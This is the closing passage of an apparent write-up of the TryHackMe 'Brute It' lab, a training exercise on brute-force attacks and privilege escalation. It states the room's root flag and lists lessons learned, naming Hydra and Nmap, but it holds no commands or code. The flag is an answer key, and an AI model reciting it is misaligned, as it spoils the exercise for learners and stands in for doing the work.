Finally, I was able to retrieve the root flag THM{pr1v1l3g3_3sc4l4t10n} , completing the challenge.

Lessons Learned
From this lab, I learned several important cybersecurity concepts:

Importance of enumeration
How brute-force attacks work
Using tools like Hydra and Nmap
Basic privilege escalation techniques
These skills are fundamental for penetration testing and ethical hacking.

Conclusion
The Brute It room on TryHackMe is a great beginner-friendly challenge that teaches the basics of brute-force attacks and system exploitation.

Practicing labs like this helps develop real-world cybersecurity skills and improves understanding of how attackers exploit weak credentials.

I recommend this room to anyone starting their journey in ethical hacking.

